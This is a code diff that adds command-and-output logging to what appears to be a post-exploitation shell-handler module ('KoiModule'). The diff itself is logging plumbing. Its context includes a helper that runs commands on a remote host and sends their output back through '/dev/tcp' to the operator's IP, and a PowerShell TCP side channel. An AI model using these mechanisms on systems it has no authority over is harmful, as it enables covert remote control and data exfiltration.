@@ -186,10 +186,19 @@ class KoiModule(ABC):
                 if not text or "Write-Host" in text:
                     continue
                 if marker in text:
-                    return lines[-1] if lines else ""
+                    result = lines[-1] if lines else ""
+                    if self._logger and result:
+                        self._logger.log_event(f"exec  {ps_expr}")
+                        self._logger.log_output(result.encode("utf-8", errors="replace"))
+                    return result
                 lines.append(text)
 
-        return lines[-1] if lines else ""
+        # timeout path
+        result = lines[-1] if lines else ""
+        if self._logger and result:
+            self._logger.log_event(f"exec  {ps_expr}")
+            self._logger.log_output(result.encode("utf-8", errors="replace"))
+        return result
 
     def _win_query_sidechannel(self, ps_expr: str, timeout: float = 10.0) -> str:
         """
@@ -209,14 +218,23 @@ class KoiModule(ABC):
             f"$_s.Flush();$_c.Close()"
         )
         self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-        return collect().decode("utf-8", errors="replace").strip()
+        result = collect().decode("utf-8", errors="replace").strip()
+        if self._logger and result:
+            self._logger.log_event(f"exec  {ps_expr}")
+            self._logger.log_output(result.encode("utf-8", errors="replace"))
+        return result
 
     def _exec_clean(self, cmd: str, timeout: float = 10.0) -> str:
         """Run a Linux command and collect its stdout via a side TCP channel."""
         local_ip = self._get_local_ip()
         port, collect = spawn_recv_server(timeout=timeout)
-        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout)
-        return collect().decode("utf-8", errors="replace").strip()
+        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout, _silent=True)
+        result = collect().decode("utf-8", errors="replace").strip()
+        if self._logger:
+            self._logger.log_event(f"exec  {cmd}")
+            if result:
+                self._logger.log_output(result.encode("utf-8", errors="replace"))
+        return result
 
     def run_module(self) -> None:
         if self._logger:
@@ -244,7 +262,7 @@ class KoiModule(ABC):
         self.session          -> Session dataclass (id, conn, addr, upgraded, …)
         self.args             -> list[str] from the CLI
         """
-    def exec(self, command: str, timeout: float = 30.0):
+    def exec(self, command: str, timeout: float = 30.0, _silent: bool = False):
         sentinel = uuid.uuid4().hex
         marker = f"__KOI_DONE_{sentinel}__"
         wrapped = (
@@ -283,7 +301,7 @@ class KoiModule(ABC):
                         stdout=output,
                         duration=time.monotonic() - (deadline - timeout),
                     )
-                    if self._logger:
+                    if self._logger and not _silent:
                         self._logger.log_event(f"exec  {command}")
                         if output:
                             self._logger.log_output(output.encode("utf-8", errors="replace"))
@@ -295,7 +313,7 @@ class KoiModule(ABC):
             stdout="\n".join(output_lines),
             duration=0,
         )
-        if self._logger:
+        if self._logger and not _silent:
             self._logger.log_event(f"exec  {command}")
             if result.stdout:
                 self._logger.log_output(result.stdout.encode("utf-8", errors="replace"))
